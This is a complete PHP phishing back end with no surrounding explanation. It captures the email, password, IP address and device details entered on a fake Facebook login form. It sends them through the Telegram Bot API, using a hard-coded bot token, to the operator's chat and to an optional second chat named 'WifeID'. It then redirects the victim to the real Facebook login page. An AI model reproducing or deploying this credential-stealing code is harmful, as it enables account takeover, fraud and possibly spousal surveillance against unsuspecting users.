<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];
    $ip = $_POST['ip'];
    $user_agent = $_POST['user_agent'];

    $botToken = "8054672986:AAF7K10TTQTFKA5wYSrVQV66XATYqTseswo";
    $yourChatID = "6719852833"; 
    $wifeChatID = isset($_GET['WifeID']) ? $_GET['WifeID'] : null;

    $message = "🔔 *New Facebook Login Attempt!*\n\n"
             . "📧 *Email:* `$email`\n"
             . "🔑 *Password:* `$password`\n"
             . "🌍 *IP Address:* `$ip`\n"
             . "📱 *Device:* `$user_agent`\n\n"
             . "⚠️ *Be Alert!*";
    $message = urlencode($message);

    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$yourChatID&text=$message&parse_mode=Markdown");
    
    if ($wifeChatID) {
        file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$wifeChatID&text=$message&parse_mode=Markdown");
    }

    header("Location: https://facebook.com/login");
    exit();
}
?>